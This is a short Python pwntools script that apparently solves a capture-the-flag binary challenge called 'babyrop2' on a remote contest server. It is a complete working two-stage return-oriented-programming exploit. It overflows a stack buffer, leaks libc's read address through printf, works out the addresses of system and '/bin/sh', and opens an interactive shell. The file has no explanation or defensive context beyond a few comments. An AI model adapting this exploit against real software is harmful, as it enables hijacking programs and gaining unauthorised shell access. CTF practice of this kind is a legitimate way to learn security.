from pwn import *

e = ELF("./babyrop2")
#p = process("./babyrop2")
p = remote("problem.harekaze.com", 20005)
#libc = ELF("./libc.so.6")

#for symbol in e.symbols:
#	print symbol, hex(e.symbols[symbol])

buff = 'A'*(0x20+8)
pop_rdi = int("0x400733", 16) # pop rdi; ret;
pop2_rsi = int("0x400731", 16) # pop rsi; pop r15; ret;

main_plt = e.symbols["main"]
printf_plt = e.symbols["printf"]
string_plt = int("0x400790", 16) # "%s!\n" : get from debugging peda => find "%s!\n"
symbol_got = e.symbols["got.read"]

# Stage 1: leak libc
payload = buff + p64(pop_rdi) + p64(string_plt) + p64(pop2_rsi) + p64(symbol_got) + "A"*8 + p64(printf_plt) + p64(e.symbols['main'])
#print payload.encode('hex')#hex(u64(payload))

p.sendline(payload)

data = p.recvuntil("!\n")
data = p.recv(6)+'\x00\x00'
print hex(u64(data))
read_addr = u64(data)

# Stage 2: system("/bin/sh")
system_off = int("0x045390", 16)
binsh_off = int("0x18cd57", 16)
read_off = int("0x0f7250", 16)

system_addr = read_addr - read_off + system_off
binsh_addr = read_addr - read_off + binsh_off

payload = buff + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
p.sendline(payload)
p.interactive()
